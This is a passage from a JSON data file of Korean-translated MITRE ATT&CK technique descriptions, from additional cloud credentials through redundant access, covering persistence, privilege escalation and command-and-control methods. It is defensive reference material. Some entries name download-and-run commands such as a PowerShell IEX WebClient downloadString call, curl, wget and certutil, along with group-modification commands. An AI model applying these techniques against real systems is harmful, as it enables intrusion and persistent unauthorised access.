요청 계정과 다를 경우, 공격자는 환경에서 자신의 권한을 상승시킬 수 있습니다. 예를 들어, Entra ID 환경에서 애플리케이션 관리자 역할을 가진 공격자는 자신의 애플리케이션 서비스 프린시펄에 새로운 자격 증명 세트를 추가할 수 있습니다. 이를 통해 공격자는 서비스 프린시펄의 역할 및 권한에 액세스할 수 있게 되며, 이는 애플리케이션 관리자의 권한과 다를 수 있습니다.\n\nAWS 환경에서는 적절한 권한을 가진 공격자가 `sts:GetFederationToken` API 호출을 사용하여 원래 사용자 계정의 권한에 연결된 일시적인 자격 증명 세트를 [위조 웹 자격 증명](https://attack.mitre.org/techniques/T1606) 생성할 수 있습니다. 이러한 일시적인 자격 증명은 원본 계정의 API 자격 증명이 비활성화되더라도 수명 동안 유효할 수 있습니다.\n\nEntra ID 환경에서 앱 비밀번호 기능이 활성화된 경우, 공격자는 사용자 계정에 앱 비밀번호를 추가할 수 있습니다. 앱 비밀번호는 다단계 인증(MFA)을 지원하지 않는 레거시 장치에서 사용하기 위해 설계되었기 때문에, 공격자가 앱 비밀번호를 추가하면 MFA 요구 사항을 우회할 수 있습니다. 또한, 앱 비밀번호는 사용자의 기본 비밀번호가 재설정되더라도 유효할 수 있습니다.",
      "external_id": "T1098.001",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Additional Cloud Credentials",
      "translated": true
    },
    {
      "description": "적대자는 적대자가 제어하는 이메일 계정에 지속적인 접근을 유지하기 위해 추가 권한 수준을 부여할 수 있습니다.\n\n예를 들어, 온프레미스 Exchange 및 클라우드 서비스인 Office 365에서 사용할 수 있는 <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) 명령어는 메일박스에 권한을 추가합니다.(인용: Microsoft - Add-MailboxPermission)(인용: FireEye APT35 2018)(인용: Crowdstrike Hiding in Plain Sight 2018) Google Workspace에서는 Google Admin 콘솔을 통해 위임을 활성화할 수 있으며, 사용자는 Gmail 설정을 통해 계정을 위임할 수 있습니다.(인용: Gmail Delegation)(인용: Google Ensuring Your Information is Safe)\n\n적대자는 개별 폴더 권한이나 역할을 통해 메일박스 폴더 권한을 부여할 수도 있습니다. Office 365 환경에서는 적대자가 기본(Default) 또는 익명(Anonymous) 사용자 권한이나 역할을 정보 저장소의 최상위(root), 받은 편지함(Inbox) 또는 기타 메일박스 폴더에 부여할 수 있습니다. 한 폴더에 대해 하나 또는 두 개의 사용자 권한을 할당함으로써, 적대자는 임대 내의 다른 계정을 사용하여 대상 사용자의 메일 폴더에 대한 지속성을 유지할 수 있습니다.(인용: Mandiant Defend UNC2452 White Paper)\n\n이 방법은 지속적인 위협 사건뿐만 아니라 BEC(비즈니스 이메일 침해) 사건에서도 사용될 수 있으며, 여기서 적대자는 침해하려는 계정에 [추가 클라우드 역할](https://attack.mitre.org/techniques/T1098/003)을 추가할 수 있습니다. 이는 시스템에 접근하기 위한 추가 기술을 사용할 수 있도록 더욱 용이하게 합니다. 예를 들어, 침해된 비즈니스 계정은 종종 대상 비즈니스의 네트워크에 있는 다른 계정으로 메시지를 전송할 때, 스팸/피싱 탐지 메커니즘을 피하기 위해 받은 편지함 규칙을 생성하면서 사용됩니다(예: [내부 스피어 피싱](https://attack.mitre.org/techniques/T1534)).(인용: Bienstock, D. - Defending O365 - 2019)",
      "external_id": "T1098.002",
      "modified": "2024-10-15T15:37:25.303Z",
      "title": "Additional Email Delegate Permissions",
      "translated": true
    },
    {
      "description": "적대자는 자신이 제어하는 클라우드 계정에 추가적인 역할이나 권한을 추가하여 테넌트에 대한 지속적인 접근을 유지할 수 있습니다. 예를 들어, 적대자는 클라우드 기반 환경에서 IAM 정책을 업데이트하거나 Office 365 환경에 새로운 글로벌 관리자를 추가할 수 있습니다.(인용: AWS IAM 정책 및 권한)(인용: 구글 클라우드 IAM 정책)(인용: Microsoft 지원 O365 다른 관리자 추가, 2019년 10월)(인용: Microsoft O365 관리 역할) 충분한 권한을 가진 손상된 계정은 데이터 및 설정에 거의 무제한으로 접근할 수 있으며, 다른 관리자 계정의 비밀번호를 재설정할 수 있는 능력도 포함됩니다.(인용: Expel AWS 공격자)\n\n이 계정 수정은 [계정 생성](https://attack.mitre.org/techniques/T1136) 또는 기타 악의적인 계정 활동 다음에 즉시 발생할 수 있습니다. 적대자는 자신이 손상시킨 기존의 [유효 계정](https://attack.mitre.org/techniques/T1078)을 수정할 수도 있습니다. 이는 추가 계정으로의 수직적 이동을 허용하는 역할이 추가될 경우 권한 상승으로 이어질 수 있습니다.\n\n예를 들어, AWS 환경에서 적대자는 적절한 권한을 가진 경우 <code>CreatePolicyVersion</code> API를 사용하여 IAM 정책의 새로운 버전을 정의하거나 <code>AttachUserPolicy</code> API를 사용하여 손상된 사용자 계정에 추가 또는 고유한 권한을 가진 IAM 정책을 연결할 수 있습니다.(인용: Rhino Security Labs AWS 권한 상승)\n\n일부 경우, 적대자는 피해자의 클라우드 테넌트 외부에 있는 적대자가 제어하는 계정에 역할을 추가할 수 있습니다. 이렇게 하면 이러한 외부 계정이 피해자의 테넌트 내에서 행동을 수행할 수 있으며, 적대자가 [계정 생성](https://attack.mitre.org/techniques/T1136) 또는 피해자 소유의 계정을 수정할 필요가 없습니다.(인용: Invictus IR DangerDev 2024)",
      "external_id": "T1098.003",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Additional Cloud Roles",
      "translated": true
    },
    {
      "description": "적대자들은 희생자의 호스트에서 지속성을 유지하기 위해 SSH의 `<code>authorized_keys</code>` 파일을 수정할 수 있습니다. 리눅스 배포판과 macOS는 원격 관리의 SSH 세션 인증 프로세스를 보호하기 위해 일반적으로 키 기반 인증을 사용합니다. SSH의 `<code>authorized_keys</code>` 파일은 파일이 구성된 사용자 계정으로 로그인하는 데 사용할 수 있는 SSH 키를 지정합니다. 이 파일은 일반적으로 사용자의 홈 디렉토리 내의 `<code>&lt;user-home&gt;/.ssh/authorized_keys</code>` 경로에 위치합니다. (출처: SSH Authorized Keys) 사용자는 시스템의 SSH 구성 파일을 수정하여 PubkeyAuthentication 및 RSAAuthentication 지시어를 값 “yes”로 설정하여 공개 키 및 RSA 인증이 활성화되도록 할 수 있습니다. SSH 구성 파일은 일반적으로 `<code>/etc/ssh/sshd_config</code>` 경로에 위치합니다.\n\n적대자들은 스크립트나 셸 명령어를 통해 SSH `<code>authorized_keys</code>` 파일을 직접 수정하여 자신이 제공한 공개 키를 추가할 수 있습니다. 클라우드 환경에서는 적대자가 특정 가상 머신의 SSH `<code>authorized_keys</code>` 파일을 명령줄 인터페이스 또는 REST API를 통해 수정할 수 있습니다. 예를 들어, Google Cloud CLI의 “add-metadata” 명령을 사용하여 적대자는 사용자 계정에 SSH 키를 추가할 수 있습니다. (출처: Google Cloud Add Metadata)(출처: Google Cloud Privilege Escalation) 마찬가지로, Azure에서는 적대자가 API에 PATCH 요청을 통해 가상 머신의 `<code>authorized_keys</code>` 파일을 업데이트할 수 있습니다. (출처: Azure Update Virtual Machines) 이는 적대자가 해당 개인 키를 소유하고 있는 경우 SSH를 통해 기존 사용자로 로그인할 수 있도록 보장합니다. (출처: Venafi SSH Key Abuse)(출처: Cybereason Linux Exim Worm) 또한 이는 요청하는 사용자와 별개의 권한을 가진 가상 머신이나 인스턴스에서 권한 상승을 초래할 수 있습니다.\n\n클라우드 API 또는 명령줄 인터페이스를 통해 `<code>authorized_keys</code>` 파일이 수정되는 경우, 적대자가 더 높은 권한을 가진 사용자에게 키를 추가하면 대상 가상 머신에서 권한 상승을 달성할 수 있습니다.\n\nSSH 키는 또한 `ip ssh pubkey-chain` [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008) 명령을 사용하여 네트워크 장치의 계정에 추가될 수 있습니다. (출처: cisco_ip_ssh_pubkey_ch_cmd)",
      "external_id": "T1098.004",
      "modified": "2023-10-03T17:38:21.121Z",
      "title": "SSH Authorized Keys",
      "translated": true
    },
    {
      "description": "공격자는 적대자가 제어하는 계정에 장치를 등록할 수 있습니다. 장치는 네트워크 인증을 처리하는 다단계 인증(MFA) 시스템이나 장치 접근 및 준수를 처리하는 장치 관리 시스템에 등록될 수 있습니다.\n\nDuo 또는 Okta와 같은 MFA 시스템은 사용자가 MFA 요구 사항을 완료하기 위해 계정과 장치를 연관시킬 수 있도록 합니다. 사용자의 자격 증명을 탈취한 적대자는 새로운 장치를 등록하여 최초의 MFA 요구 사항을 우회하고 네트워크에 지속적으로 접근할 수 있습니다. (출처: CISA MFA PrintNightmare) (출처: DarkReading FireEye SolarWinds) 경우에 따라 MFA 셀프 등록 프로세스는 계정의 첫 번째 장치를 등록하기 위해 사용자 이름과 비밀번호만으로도 가능할 수 있습니다. (출처: Mandiant APT29 Microsoft 365 2022)\n\n유사하게, 네트워크에 기존 접근 권한이 있는 적대자는 Entra ID 및/또는 장치 관리 시스템인 Microsoft Intune에 장치를 등록하여 민감한 데이터나 자원에 접근하면서 조건부 접근 정책을 우회할 수 있습니다. (출처: AADInternals - Device Registration) (출처: AADInternals - Conditional Access Bypass) (출처: Microsoft DEV-0537)\n\nEntra ID에 등록된 장치는 내부 조직 이메일을 통해 [내부 스피어피싱](https://attack.mitre.org/techniques/T1534) 캠페인을 수행할 수 있으며, 이는 이메일 클라이언트에서 의심스럽게 보지 않을 가능성이 높습니다. (출처: Microsoft - Device Registration) 또한, 적대자는 많은 수의 장치를 등록하여 Entra ID 테넌트에 대해 [서비스 소모 홍수 공격](https://attack.mitre.org/techniques/T1499/002)을 수행할 수 있습니다. (출처: AADInternals - BPRT)",
      "external_id": "T1098.005",
      "modified": "2024-09-25T20:39:53.597Z",
      "title": "Device Registration",
      "translated": true
    },
    {
      "description": "적대자는 적대자가 제어하는 사용자 또는 서비스 계정에 추가 역할이나 권한을 추가하여 컨테이너 오케스트레이션 시스템에 대한 영구적인 접근을 유지할 수 있습니다. 예를 들어, 충분한 권한을 가진 적대자는 RoleBinding 또는 ClusterRoleBinding을 생성하여 Kubernetes 계정에 Role 또는 ClusterRole을 바인딩할 수 있습니다.(출처: Kubernetes RBAC)(출처: Aquasec Kubernetes Attack 2023) 속성 기반 접근 제어(ABAC)가 사용되는 경우, 충분한 권한을 가진 적대자는 Kubernetes ABAC 정책을 수정하여 대상 계정에 추가 권한을 부여할 수 있습니다.(출처: Kubernetes ABAC)\n\n이 계정 수정은 [계정 생성](https://attack.mitre.org/techniques/T1136) 또는 기타 악의적인 계정 활동에 즉각적으로 이어질 수 있습니다. 적대자는 또한 자신이 손상시킨 기존의 [유효 계정](https://attack.mitre.org/techniques/T1078)을 수정할 수 있습니다.\n\n컨테이너 오케스트레이션 시스템이 Google Kubernetes Engine, Amazon Elastic Kubernetes Service, Azure Kubernetes Service와 같은 클라우드 환경에 배포되는 경우, 클라우드 기반 역할 기반 접근 제어(RBAC) 할당 또는 ABAC 정책이 로컬 권한 할당의 대체 또는 추가로 사용될 수 있다는 점에 유의해야 합니다.(출처: Google Cloud Kubernetes IAM)(출처: AWS EKS IAM Roles for Service Accounts)(출처: Microsoft Azure Kubernetes Service Service Accounts) 이러한 경우, 이 기술은 [추가 클라우드 역할](https://attack.mitre.org/techniques/T1098/003)과 함께 사용될 수 있습니다.",
      "external_id": "T1098.006",
      "modified": "2023-10-16T17:51:35.865Z",
      "title": "Additional Container Cluster Roles",
      "translated": true
    },
    {
      "description": "침략자는 지속적으로 시스템이나 도메인에 접근하기 위해 침략자 제어 계정에 추가적인 로컬 또는 도메인 그룹을 추가할 수 있습니다.\n\nWindows에서는 `net localgroup` 및 `net group` 명령어를 사용하여 기존 사용자를 로컬 및 도메인 그룹에 추가할 수 있습니다.(참고: Microsoft Net Localgroup)(참고: Microsoft Net Group) Linux에서는 `usermod` 명령어를 같은 목적으로 사용할 수 있습니다.(참고: Linux Usermod)\n\n예를 들어, Windows 장치의 로컬 관리자 그룹에 계정을 추가하여 권한을 상승시킬 수 있습니다. 또한 Remote Desktop Users 그룹에 추가되어 [원격 데스크톱 프로토콜](https://attack.mitre.org/techniques/T1021/001)을 통해 향후 단말기에 로그인할 수 있도록 할 수 있습니다.(참고: Microsoft RDP Logons) Linux에서는 계정을 sudoers 그룹에 추가하여 지속적으로 [Sudo 및 Sudo 캐싱](https://attack.mitre.org/techniques/T1548/003)을 통해 권한을 상승시킬 수 있습니다.\n\nWindows 환경에서는 머신 계정을 도메인 그룹에 추가하는 것도 가능합니다. 이를 통해 로컬 SYSTEM 계정이 도메인에서 권한을 획득할 수 있습니다.(참고: RootDSE AD Detection 2022)",
      "external_id": "T1098.007",
      "modified": "2024-10-14T14:32:08.926Z",
      "title": "Additional Local or Domain Groups",
      "translated": true
    },
    {
      "description": "위협 행위자들은 새로운 파일을 배포하거나 기존 파일을 수정하는 작업을 숨겨 자신의 활동을 모호하게 만들기 위해 행동할 수 있습니다. 타임스탬핑(Timestomping)은 파일의 타임스탬프(수정, 접근, 생성 및 변경 시간을 수정하는) 를 변경하는 기법으로, 종종 동일 폴더 내의 파일을 모방하는 데 사용됩니다. 이는 예를 들어, 위협 행위자가 수정하거나 생성한 파일에 대해 수행되어 포렌식 조사자나 파일 분석 도구에 눈에 띄지 않도록 합니다. 타임스탬핑은 맬웨어 및 도구를 숨기기 위해 파일 이름 은폐(Masquerading)와 함께 사용될 수 있습니다. (출처: WindowsIR Anti-Forensic Techniques)",
      "external_id": "T1099",
      "modified": "2020-02-18T16:56:57.039Z",
      "title": "Timestomp",
      "translated": true
    },
    {
      "description": "웹 쉘은 적이 웹 서버를 통해 네트워크에 접근할 수 있도록 공개적으로 접근 가능한 웹 서버에 배치된 웹 스크립트입니다. 웹 쉘은 웹 서버를 호스팅하는 시스템에서 실행할 수 있는 기능 모음이나 명령줄 인터페이스를 제공할 수 있습니다. 서버 측 스크립트 외에도 웹 쉘은 웹 서버와 통신하는 데 사용되는 클라이언트 인터페이스 프로그램이 있을 수 있습니다 (예를 들어, 중국 차퍼 웹 쉘 클라이언트를 참조하십시오). (인용: Lee 2013)\n\n웹 쉘은 [중복 접근](https://attack.mitre.org/techniques/T1108) 수단이나 적의 주요 접근 방법이 감지되고 제거될 경우 지속성 메커니즘으로 작용할 수 있습니다.",
      "external_id": "T1100",
      "modified": "2020-03-19T20:22:02.163Z",
      "title": "Web Shell",
      "translated": true
    },
    {
      "description": "Windows 보안 지원 공급자(SSP) DLL은 시스템 시작 시 로컬 보안 기관(LSA) 프로세스에 로드됩니다. LSA에 로드되면 SSP DLL은 Windows에 저장된 암호화된 비밀번호와 일반 텍스트 비밀번호에 접근할 수 있습니다. 예를 들어, 로그온된 사용자의 도메인 비밀번호나 스마트 카드 PIN과 같은 정보에 접근할 수 있습니다. SSP 구성은 두 개의 레지스트리 키에 저장됩니다: `<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code>` 및 `<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>`. 공격자는 이러한 레지스트리 키를 수정하여 새로운 SSP를 추가할 수 있으며, 이는 다음 번 시스템 부팅 시 또는 AddSecurityPackage Windows API 함수가 호출될 때 로드됩니다. (출처: Graeber 2014)",
      "external_id": "T1101",
      "modified": "2020-01-24T17:35:47.598Z",
      "title": "Security Support Provider",
      "translated": true
    },
    {
      "description": " adversaries는 손상된 시스템과 데이터를 주고받기 위한 수단으로 기존의 합법적인 외부 웹 서비스를 사용할 수 있습니다. 인기 있는 웹사이트, 클라우드 서비스 및 소셜 미디어는 C2(명령과 제어) 메커니즘으로 작용하며, 사전 손상 이전에 네트워크 내 호스트가 이미 이러한 서비스와 통신할 가능성이 높기 때문에 상당한 은폐를 제공할 수 있습니다. Google, Microsoft 또는 Twitter와 같은 일반적인 서비스를 사용하면 적들이 예상되는 잡음 속에서 숨기기가 더 쉬워집니다.(출처: Broadcom BirdyClient Microsoft Graph API 2024) 웹 서비스 제공자는 일반적으로 SSL/TLS 암호화를 사용하므로 적들은 추가적인 보호 수준을 얻을 수 있습니다.\n\n웹 서비스의 사용은 또한 맬웨어 이진 분석을 통해 백엔드 C2 인프라의 발견을 방지하며, 운용적 회복력을 가능하게 합니다(이 인프라는 동적으로 변경될 수 있음).",
      "external_id": "T1102",
      "modified": "2024-10-07T17:53:54.380Z",
      "title": "Web Service",
      "translated": true
    },
    {
      "description": "위협 행위자는 기존의 합법적인 외부 웹 서비스를 사용하여 추가적인 명령 및 제어(C2) 인프라를 가리키는 정보를 호스팅할 수 있습니다. 이들은 웹 서비스에 콘텐츠를 게시하며, 이를 \"데드 드롭 리졸버\"라고 합니다. 이 리졸버는 내장된(대개 혼란스럽거나 인코딩된) 도메인이나 IP 주소를 포함하고 있습니다. 감염된 피해자는 이러한 리졸버에 접근하여 리디렉션됩니다.\n\nC2의 메커니즘으로 작용하는 인기 있는 웹사이트 및 소셜 미디어는 네트워크 내 호스트가 손상되기 전에 이미 이러한 사이트들과 통신하고 있을 가능성 때문에 상당한 범죄 행위를 은폐할 수 있습니다. Google이나 Twitter와 같은 일반 서비스를 이용하는 것은 위협 행위자가 예상되는 잡음 속에서 숨기기 쉽게 만듭니다. 웹 서비스 제공업체는 일반적으로 SSL/TLS 암호화를 사용하여 위협 행위자에게 추가적인 보호 수준을 제공합니다.\n\n데드 드롭 리졸버를 사용하면 악성코드 이진 분석을 통한 백엔드 C2 인프라의 발견을 방지할 수 있으며, 이 인프라가 동적으로 변경될 수 있기 때문에 운영 회복력을 강화할 수 있습니다.",
      "external_id": "T1102.001",
      "modified": "2020-03-26T23:12:30.499Z",
      "title": "Dead Drop Resolver",
      "translated": true
    },
    {
      "description": "침해한 시스템으로부터 명령을 전송하고 출력을 수신하기 위해 공격자는 기존의 합법적인 외부 웹 서비스를 사용할 수 있습니다. 침해된 시스템은 명령 및 제어(C2) 지침을 호스팅하기 위해 인기 있는 웹사이트와 소셜 미디어를 활용할 수 있습니다. 감염된 시스템은 그 명령의 출력을 해당 웹 서비스 채널을 통해 다시 전송할 수 있습니다. 반환 트래픽은 사용되는 웹 서비스에 따라 다양한 방식으로 발생할 수 있습니다. 예를 들어, 반환 트래픽은 침해된 시스템이 포럼에 댓글을 게시하거나 개발 프로젝트에 풀 리퀘스트를 발행하거나 웹 서비스에 호스팅된 문서를 업데이트하거나 트윗을 보내는 형태일 수 있습니다.\n\nC2 메커니즘으로 작용하는 인기 있는 웹사이트와 소셜 미디어는 네트워크 내 호스트가 침해 이전에 이미 그들과 통신하고 있었을 가능성 때문에 상당한 은폐 효과를 제공할 수 있습니다. Google 또는 Twitter와 같은 일반 서비스를 사용하면 공격자가 예상되는 소음 속에 숨기를 더 쉽게 할 수 있습니다. 웹 서비스 제공자는 일반적으로 SSL/TLS 암호화를 사용하므로 공격자에게 추가적인 보호 수준을 제공합니다.",
      "external_id": "T1102.002",
      "modified": "2020-03-26T23:15:47.861Z",
      "title": "Bidirectional Communication",
      "translated": true
    },
    {
      "description": "공격자는 기존의 합법적인 외부 웹 서비스를 이용하여 악성 시스템에 명령을 전송할 수 있으며, 웹 서비스 채널을 통해 반환 출력을 받지 않을 수 있습니다. 감염된 시스템은 명령 및 제어(C2) 지침을 호스팅하기 위해 인기 있는 웹사이트와 소셜 미디어를 활용할 수 있습니다. 이러한 감염된 시스템은 명령의 출력을 다른 C2 채널을 통해, 예를 들어 다른 독립적인 웹 서비스로 전송할 수 있습니다. 또는 공격자가 시스템에 지침을 전송하고 응답을 원하지 않을 경우에는 아예 출력을 반환하지 않을 수 있습니다.\n\nC2의 매개체로 기능하는 인기 있는 웹사이트와 소셜 미디어는 네트워크 내 호스트들이 이미 이러한 서비스와 통신하고 있을 가능성 때문에 상당한 양의 은폐 효과를 제공할 수 있습니다. Google이나 Twitter와 같은 일반적인 서비스를 사용하면 공격자가 예상되는 잡음 속에 숨어들기 쉬워집니다. 웹 서비스 제공자는 일반적으로 SSL/TLS 암호화를 사용하여 공격자에게 추가적인 보호 수준을 제공합니다.",
      "external_id": "T1102.003",
      "modified": "2020-03-26T23:26:10.109Z",
      "title": "One-Way Communication",
      "translated": true
    },
    {
      "description": "동적 연결 라이브러리(DLL)는 레지스트리 키 <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> 또는 <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>의 AppInit_DLLs 값에 지정되어 있으며, user32.dll에 의해 user32.dll을 로드하는 모든 프로세스에 로드됩니다. 실제로, user32.dll은 매우 일반적인 라이브러리이므로 이는 거의 모든 프로그램에 해당됩니다. (출처: Elastic Process Injection July 2017) [프로세스 주입](https://attack.mitre.org/techniques/T1055)과 유사하게, 이러한 값들은 악성 DLL이 로드되어 컴퓨터의 별도의 프로세스에서 실행되도록 하여 지속성과 권한 상승을 얻기 위해 악용될 수 있습니다. (출처: AppInit Registry)\n\nAppInit DLL 기능은 Windows 8 및 이후 버전에서 안전 부팅이 활성화된 경우 비활성화됩니다. (출처: AppInit Secure Boot)",
      "external_id": "T1103",
      "modified": "2020-11-10T18:29:30.379Z",
      "title": "AppInit DLLs",
      "translated": true
    },
    {
      "description": "공격자는 서로 다른 조건이나 특정 기능에 따라 사용되는 명령 및 제어의 여러 단계를 생성할 수 있습니다. 여러 단계를 사용함으로써 명령 및 제어 채널을 은폐하여 탐지를 더 어렵게 만들 수 있습니다.\n\n원격 접속 도구는 지침을 위해 첫 번째 단계의 명령 및 제어 서버에 콜백을 합니다. 첫 번째 단계는 기본 호스트 정보 수집, 도구 업데이트 및 추가 파일 업로드와 같은 자동화된 기능을 가질 수 있습니다. 이 시점에서 두 번째 원격 접속 도구(RAT)가 업로드되어 호스트를 두 번째 단계의 명령 및 제어 서버로 리디렉션할 수 있습니다. 두 번째 단계는 더 많은 기능을 제공하며, 공격자가 역 셸 및 추가 RAT 기능을 통해 시스템과 상호작용할 수 있게 할 것입니다.\n\n각 단계는 중복된 인프라 없이 별도로 호스팅될 가능성이 높습니다. 로더는 원래의 첫 번째 단계 통신 경로가 발견되고 차단될 경우를 대비하여 백업 첫 번째 단계 콜백이나 [Fallback Channels](https://attack.mitre.org/techniques/T1008)를 가질 수 있습니다.",
      "external_id": "T1104",
      "modified": "2020-07-14T19:43:38.181Z",
      "title": "Multi-Stage Channels",
      "translated": true
    },
    {
      "description": "공격자는 외부 시스템에서 손상된 환경으로 도구나 기타 파일을 전송할 수 있습니다. 도구나 파일은 외부 적대자가 제어하는 시스템에서 희생자 네트워크로 명령 및 제어 채널 또는 [ftp](https://attack.mitre.org/software/S0095)와 같은 대체 프로토콜을 통해 복사될 수 있습니다. 일단 파일이 존재하게 되면, 공격자는 손상된 환경 내의 희생자 장치 간에 도구를 전송하거나 확산시킬 수도 있습니다 (예: [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)).\n\nWindows에서는 공격자가 `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160) 및 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 명령어를 사용하여 도구를 다운로드할 수 있습니다. 여기에는 `<code>IEX(New-Object Net.WebClient).downloadString()</code>` 및 `<code>Invoke-WebRequest</code>`와 같은 명령이 포함됩니다. Linux 및 macOS 시스템에서도 `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, `wget`과 같은 다양한 유틸리티가 존재합니다. (출처: t1105_lolbas)\n\n공격자는 또한 `yum` 또는 `winget`과 같은 설치 프로그램 및 패키지 관리자를 악용하여 희생자 호스트로 도구를 다운로드할 수 있습니다. 공격자는 또한 Windows `search-ms` 프로토콜 핸들러와 같은 파일 응용 프로그램 기능을 악용하여 [User Execution](https://attack.mitre.org/techniques/T1204) (일반적으로 [Phishing](https://attack.mitre.org/techniques/T1566) 유인물과 상호작용한 후) 통해 악성 파일을 희생자에게 전달할 수 있습니다. (출처: T1105: Trellix_search-ms)\n\n파일은 다양한 [Web Service](https://attack.mitre.org/techniques/T1102)와 희생자 시스템에 존재하는 네이티브 또는 기타 도구를 사용하여 전송할 수도 있습니다. (출처: PTSecurity Cobalt Dec 2016) 경우에 따라서, 공격자는 Dropbox나 OneDrive와 같은 웹 기반 클라이언트와 온프레미스 클라이언트 간에 동기화되는 서비스를 활용하여 희생자 시스템으로 파일을 전송할 수 있습니다. 예를 들어, 클라우드 계정을 손상시키고 서비스의 웹 포털에 로그인함으로써, 공격자는 파일을 희생자의 머신으로 자동으로 전송하는 동기화 프로세스를 트리거할 수 있습니다. (출처: Dropbox Malware Sync)",
      "external_id": "T1105",
      "modified": "2024-04-11T15:08:01.731Z",
      "title": "Ingress Tool Transfer",
      "translated": true
    },
    {
      "description": "상대방은 본래 운영 체제의 응용 프로그램 프로그래밍 인터페이스(API)와 상호작용하여 행동을 실행할 수 있습니다. 본래 API는 하드웨어/장치, 메모리 및 프로세스와 관련된 낮은 수준의 OS 서비스를 호출하는 제어된 수단을 제공합니다.(인용: NT API Windows)(인용: Linux Kernel API) 이러한 본래 API는 시스템 부팅 중(다른 시스템 구성 요소가 아직 초기화되지 않았을 때) 및 일반적인 작업 수행 중에 OS에 의해 활용됩니다.\n\n상대방은 이러한 OS API 기능을 남용하여 행동을 실행하는 수단으로 활용할 수 있습니다. [명령어 및 스크립트 인터프리터](https://attack.mitre.org/techniques/T1059)와 유사하게, 본래 API 및 그 계층 구조는 피해 시스템의 다양한 구성 요소와 상호작용하고 활용하는 메커니즘을 제공합니다.\n\n본래 API 함수(예: `<code>NtCreateProcess</code>`)는 시스템 호출/syscall을 통해 직접적으로 호출될 수 있지만, 이러한 기능은 종종 인터페이스 및 라이브러리를 통해 사용자 모드 응용 프로그램에 노출됩니다.(인용: OutFlank System Calls)(인용: CyberBit System Calls)(인용: MDSec System Calls) 예를 들어, Windows API의 `<code>CreateProcess()</code>` 또는 GNU의 `<code>fork()</code>`와 같은 함수는 프로그램과 스크립트가 다른 프로세스를 시작할 수 있도록 허용합니다.(인용: Microsoft CreateProcess)(인용: GNU Fork) 이는 API 호출자가 바이너리를 실행하거나 CLI 명령어를 실행하며, 모듈을 로드하는 등의 작업을 수행할 수 있도록 합니다. 다양한 시스템 작업을 위한 수천 개의 유사한 API 함수가 존재합니다.(인용: Microsoft Win32)(인용: LIBC)(인용: GLIBC)\n\nMicrosoft .NET 및 macOS Cocoa와 같은 고급 소프트웨어 프레임워크도 본래 API와 상호작용할 수 있습니다. 이러한 프레임워크는 일반적으로 API 기능에 대한 언어 래퍼/추상화를 제공하며 코드의 사용 용이성 및 이동성을 위해 설계되었습니다.(인용: Microsoft NET)(인용: Apple Core Services)(인용: MACOS Cocoa)(인용: macOS Foundation)\n\n상대방은 방어 센서 및 사용자 모드 API 훅과 같은 탐지 서명을 우회하려는 시도로 어셈블리를 사용하여 syscalls를 직접 또는 간접적으로 호출할 수 있습니다.(인용: Redops Syscalls) 또한, 상대방은 [도구 비활성화 또는 수정](https://attack.mitre.org/techniques/T1562/001)과 같은 API 모니터링과 관련된 센서 및 방어 도구를 변조하려고 시도할 수 있습니다.",
      "external_id": "T1106",
      "modified": "2024-09-12T15:25:57.058Z",
      "title": "Native API",
      "translated": true
    },
    {
      "description": "침입 활동의 결과로 남겨진 파일을 공격자가 삭제할 수 있습니다. 공격자가 시스템에 드롭하거나 생성한 맬웨어, 도구 또는 기타 비네이티브 파일은 네트워크 내에서 수행된 작업과 그 방법을 나타내는 흔적을 남길 수 있습니다. 이러한 파일의 제거는 침입 중에 발생할 수 있으며, 공격자의 흔적을 최소화하기 위한 침입 후 프로세스의 일환으로 수행될 수도 있습니다.\n\n호스트 운영 체제에는 정리를 수행할 수 있는 도구가 제공되지만, 공격자는 다른 도구도 사용할 수 있습니다. 예를 들어, DEL과 같은 네이티브 [cmd](https://attack.mitre.org/software/S0106) 기능, Windows Sysinternals SDelete와 같은 보안 삭제 도구, 또는 기타 서드파티 파일 삭제 도구가 있습니다. (출처: Trend Micro APT 공격 도구)",
      "external_id": "T1107",
      "modified": "2020-01-31T12:36:39.086Z",
      "title": "File Deletion",
      "translated": true
    },
    {
      "description": "**이 기술은 더 이상 사용되지 않습니다. 적절한 경우 [계정 생성](https://attack.mitre.org/techniques/T1136), [웹 셸](https://attack.mitre.org/techniques/T1505/003), 및 [외부 원격 서비스](https://attack.mitre.org/techniques/T1133)를 사용하시기 바랍니다.**\n\n적대자는 원격 액세스 도구를 여러 개 사용하고 다양한 명령 및 제어 프로토콜 또는 인증된 액세스를 통해 원격 서비스에 접근하여 액세스 메커니즘이 탐지되거나 완화되는 경우에도 지속적으로 액세스를 유지할 수 있습니다.\n\n한 종류의 도구가 탐지되어 차단되거나 제거되었다고 하더라도 조직이 적대자의 도구와 접근 방식에 대한 완전한 이해를 하지 못하였다면, 적대자는 네트워크에 대한 액세스를 유지할 수 있습니다. 적대자는 또한 [유효 계정](https://attack.mitre.org/techniques/T1078)에 접근하여 외부 VPN과 같은 [외부 원격 서비스](https://attack.mitre.org/techniques/T1133)를 사용하여 목표 네트워크 내에서 배포된 원격 액세스 도구의 중단에도 불구하고 액세스를 유지하고자 할 수 있습니다. (출처: Mandiant APT1) 적대자는 또한 클라우드 기반 인프라 및 애플리케이션을 통해 액세스를 유지할 수 있습니다.\n\n[웹 셸](https://attack.mitre.org/techniques/T1100)의 사용은 외부에서 접근 가능한 웹 서버를 통해 네트워크에 대한 액세스를 유지하는 한 가지 방법입니다.",
      "external_id": "T1108",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Redundant Access",
      "translated": true
    },
    {
